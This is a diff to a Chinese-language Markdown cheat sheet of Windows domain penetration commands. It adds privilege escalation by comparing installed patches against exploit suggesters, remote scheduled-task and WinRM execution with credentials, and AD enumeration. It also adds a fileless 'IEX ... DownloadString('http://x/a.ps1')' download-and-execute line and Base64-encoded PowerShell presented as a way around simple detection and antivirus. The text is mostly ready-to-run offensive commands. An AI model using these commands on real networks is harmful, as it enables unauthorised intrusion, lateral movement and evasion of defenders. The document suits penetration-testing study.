@@ -31,6 +31,19 @@
 - 查看本机加入的管理员关系：`net localgroup administrators /domain`
 - 查看域控主机：`dsquery server`
 
+### 3. systeminfo 补丁比对提权
+
+思路：拿到 `systeminfo` 输出后，把已安装补丁（Hotfixs 列表）与公开漏洞库比对，快速定位目标缺失补丁对应的本地提权漏洞。
+
+```bash
+systeminfo > a.txt
+python wes.py a.txt
+```
+
+- wesng（Windows Exploit Suggester - Next Generation）：https://github.com/bitsadmin/wesng
+- Sherlock / BeRoot 思路：以 PowerShell 脚本在目标本地枚举补丁与弱点，不落地比对文件——https://github.com/rasta-mouse/Sherlock 、https://github.com/AlessandroZ/BeRoot
+- Windows-Exploit-Suggester：https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+
 ## 0x03 远程文件操作
 
 ### 1. `net use`
@@ -112,7 +125,17 @@ psexec \\192.168.0.1 -u abc -p password cmd
 - 查看任务：`at \\192.168.0.1`
 - 删除任务：`at \\192.168.0.1 1 /delete`
 
-### 4. `winrm`
+### 4. `schtasks`（`at` 的替代）
+
+`at` 在 Win8 / Server 2012 之后逐步弃用，`schtasks` 参数更全、权限控制更细，是首选。
+
+- 创建一次性任务：`schtasks /create /tn test /tr "cmd /c ver > c:\test.txt" /sc once /st 12:00`
+- 立即执行：`schtasks /run /tn test`
+- 查看任务：`schtasks /query /tn test /v`
+- 删除任务：`schtasks /delete /tn test /f`
+- 远程操作（`/s` 指定主机，需凭证）：`schtasks /create /s 192.168.0.1 /u abc /p password /tn test /tr cmd /sc once /st 12:00`
+
+### 5. `winrm`
 
 前置条件：
 
@@ -140,7 +163,54 @@ winrs -r:http://192.168.0.1:5985 -u:abc -p:password "whoami /all"
 runas /user:abc cmd
 ```
 
-## 0x06 注意事项
+## 0x06 PowerShell 对应命令
+
+前面以 `cmd` 为主，这一节按同样的分类给出 PowerShell 等价命令，便于写脚本与免杀改造。
+
+### 1. 信息收集（基础对应）
+
+| cmd 命令 | PowerShell 等价 |
+| --- | --- |
+| `systeminfo` | `Get-ComputerInfo` |
+| `tasklist` | `Get-Process` |
+| `netstat -ano` | `Get-NetTCPConnection` |
+| `net user` | `Get-LocalUser` |
+| `net localgroup administrators` | `Get-LocalGroupMember administrators` |
+| 查杀毒软件（wmic） | `Get-CimInstance -Namespace root/securitycenter2 -ClassName antivirusproduct` |
+
+### 2. 域信息
+
+需先 `Import-Module ActiveDirectory`（域成员一般自带；无模块时可用 PowerView 替代）：
+
+- 查看域用户全属性：`Get-ADUser -Filter * -Properties *`
+- 查看域内主机：`Get-ADComputer -Filter * -Properties *`
+- 查看域管组成员：`Get-ADGroupMember "Domain Admins"`
+
+### 3. 远程执行
+
+- 单次执行（走 WinRM 5985/5986）：`Invoke-Command -ComputerName 192.168.0.1 -Credential abc -ScriptBlock {whoami}`
+- 建立持久会话：`New-PSSession -ComputerName 192.168.0.1 -Credential abc`，之后 `Enter-PSSession` 交互或 `Invoke-Command -Session $s` 复用
+
+### 4. 下载与执行
+
+```powershell
+# 无文件落地执行远程脚本
+IEX(New-Object Net.WebClient).DownloadString('http://x/a.ps1')
+
+# 下载文件（iwr / curl 是 Invoke-WebRequest 的别名）
+Invoke-WebRequest http://x/a.exe -OutFile a.exe
+```
+
+### 5. 编码执行
+
+```powershell
+# -enc / -EncodedCommand 接收 UTF-16LE 编码的 Base64，可规避命令行特殊字符与简单检测
+powershell -enc <base64>
+```
+
+生成 Base64（Linux 侧）：`echo whoami | iconv -t UTF-16LE | base64 -w 0`
+
+## 0x07 注意事项
 
 - `wmic`、`at` 在新版本系统里可用性和默认配置差异较大，先验证服务状态。
 - `psexec`、`winrm`、共享映射通常都会留下较明显的系统日志。
@@ -151,3 +221,5 @@ runas /user:abc cmd
 - https://chen1sheng.github.io/2020/11/30/%E6%B8%97%E9%80%8F/windows/Windows%E5%9F%9F%E6%B8%97%E9%80%8F%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/
 - https://www.cnblogs.com/LyShark/p/11344288.html
 - https://cloud.tencent.com/developer/article/1180419
+- https://ss64.com/nt/
+- https://learn.microsoft.com/powershell/scripting/
